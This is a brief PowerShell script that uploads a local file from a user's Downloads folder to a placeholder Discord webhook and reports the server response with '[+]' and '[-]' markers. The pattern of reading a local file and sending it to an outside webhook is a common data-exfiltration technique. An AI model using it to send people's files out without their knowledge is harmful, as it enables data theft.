$ErrorActionPreference = "Stop" # Buộc dừng và báo lỗi nếu có bất kỳ dòng nào lỗi
Add-Type -AssemblyName System.Net.Http

$webhookUrl = "https://discord.com/api/webhooks/..."
$filePath = "C:\Users\client\Downloads\abc.txt"

if (Test-Path $filePath) {
    $httpClient = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$fileBytes)
    $content.Add($fileContent, "file", "abc.txt")
    
    $result = $httpClient.PostAsync($webhookUrl, $content).GetAwaiter().GetResult()
    Write-Host "[+] Server Response: $($result.StatusCode)"
    
    $httpClient.Dispose()
    $content.Dispose()
} else {
    Write-Host "[-] File not found"
}
